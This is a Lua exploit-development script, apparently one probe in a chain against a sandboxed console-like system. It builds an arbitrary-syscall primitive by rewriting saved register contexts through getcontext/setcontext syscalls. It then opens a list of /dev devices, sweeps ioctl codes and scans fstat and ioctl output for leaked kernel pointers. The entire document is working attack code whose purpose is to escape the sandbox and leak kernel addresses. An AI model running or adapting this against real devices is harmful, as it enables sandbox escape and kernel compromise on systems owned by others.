-- CRASH_CLASS: MODERATE
-- PROBE 138c: Batch device open/fstat/read/ioctl for interesting /dev entries
--
-- 137f found 76 devices. sbl_srv can't be opened. Test remaining:
-- dbggc, encdec, a53mm, a53mmsys, acm, fttrm, duid, lvd7,
-- notification1, uvd_dec, mp3, ctty, hmd2_image, hmd2_slam_trace

print("=== PROBE 138c: DEV BATCH ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

local path_buf = gpu + 0x100
local stat_buf = gpu + 0x300
local io_buf   = gpu + 0x500

local function try_open(name)
    local flags_list = {0x2004, 0x0004, 0x2002, 0x0002, 0x2000, 0x0000}
    for _, fl in ipairs(flags_list) do
        ws(path_buf, "/dev/" .. name)
        local rv = srop(5, ua(path_buf), uint64(fl))
        local rvh, rvl = get_hi_lo(rv)
        if rvl > 0 and rvl < 256 and rvh == 0 then
            return rvl
        end
    end
    return -1
end

local devices = {
    "dbggc", "encdec", "a53mm", "a53mmsys", "acm",
    "fttrm", "duid", "lvd7", "uvd_dec", "mp3",
    "notification1", "ctty", "hmd2_image", "hmd2_slam_trace"
}

for _, name in ipairs(devices) do
    print("")
    print("--- " .. name .. " ---")
    local fd = try_open(name)
    if fd < 0 then
        print(name .. ": OPEN FAIL")
    else
        print(name .. ": fd=" .. fd)

        -- fstat scan for kernel pointers
        zero(stat_buf, 0x100)
        srop(189, uint64(fd), ua(stat_buf))
        for off = 0, 0x78, 8 do
            local v = safe_rq(stat_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("  *** KPTR stat+0x%02X: %s ***", off, hex(v)))
                end
            end
        end

        -- Quick ioctl sweep: try group letters matching device name initial
        local grps = {0x44, 0x64, 0x53, 0x73, 0x41, 0x42, 0x43, 0x47}
        local hits = 0
        for _, grp in ipairs(grps) do
            for cmd = 0, 3 do
                zero(io_buf, 0x100)
                local code = 0x40040000 + (grp * 0x100) + cmd
                local rv_io = srop(54, uint64(fd), uint64(code), ua(io_buf))
                local ioh, iol = get_hi_lo(rv_io)
                if iol == 0 and ioh == 0 then
                    hits = hits + 1
                    print(string.format("  *** ioctl 0x%08X WORKS!", code))
                    for ioff = 0, 0x38, 8 do
                        local iv = safe_rq(io_buf + ioff)
                        if iv then
                            local ivh, ivl = get_hi_lo(iv)
                            if ivh > 0 or ivl > 0 then
                                print(string.format("    +0x%02X: %s", ioff, hex(iv)))
                            end
                            if ivh >= 0xFFFF8000 and ivh ~= 0xFFFFFFFF then
                                kfound = kfound + 1
                                print("    *** KERNEL POINTER! ***")
                            end
                        end
                    end
                end
            end
        end
        print(name .. ": ioctl_hits=" .. hits)
        srop(6, uint64(fd))
    end
    print("pid=" .. to_num(sc20()))
end

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
